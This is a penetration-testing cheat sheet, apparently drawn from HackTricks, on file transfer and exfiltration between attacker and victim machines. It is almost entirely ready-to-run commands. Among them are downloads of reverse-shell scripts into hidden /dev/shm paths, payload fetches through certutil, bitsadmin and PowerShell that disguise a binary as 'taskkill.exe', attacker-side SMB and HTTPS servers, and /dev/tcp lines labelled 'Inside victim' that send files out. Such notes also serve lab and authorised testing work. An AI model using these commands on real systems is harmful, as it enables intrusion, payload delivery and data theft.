```
https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration
```


### Copy & Paste Base64

```bash
# linux
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
```powershell
# windows
certutil -encode payload.dll payload.b64 # encode
certutil -decode payload.b64 payload.dll # decode
```


---

## Sending Files Over HTTP
```bash
# linux

wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm

curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

```powershell
# windows

certutil -urlcache -split -f http://webserver/payload.b64 payload.b64

bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")

Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"

wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer

Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

##### python SimpleHttpServer With File Uploads/Downloads
```python
# https://gist.github.com/UniIsland/3346170#file-simplehttpserverwithupload-py
# python2 SSL socket wrapped HTTPS
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)

httpd.serve_forever()
```

##### python3 SSL socket wrapped HTTPS 
```python
# python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)

httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)

httpd.serve_forever()
```

```python
# Flask
from flask import Flask, redirect, request
from urllib.parse import quote

app = Flask(__name__)
@app.route('/')

def root():
	print(request.get_json())
	
	return "OK"

if __name__ == "__main__":
	app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```

---

## SMB

```bash
# linux

impacket-smbserver -smb2support kali `pwd` # Share current directory
smbserver.py -smb2support name /path/folder # Share a folder

#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`


# OR CREATE AN SMB SHARE USING SAMBA
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb

#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes

#Start samba
service smbd restart
```

```bash
# windows

\\10.10.14.14\path\to\exe
net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"

cd new_disk:
```

---

## SCP
```bash
# the attacker has to have SSHd running
scp <username>@<Attacker_IP>:<directory>/<filename>
```

---

## upload/download with /dev/tcp
```bash
# download
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim


# upload
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker

# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```


----

## PHP
```php
# download file with PHP oneliner
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

---

## DNS Exfiltration
```md
# A program to exfiltrate files from computers using the DNS
# https://github.com/62726164/dns-exfil
```
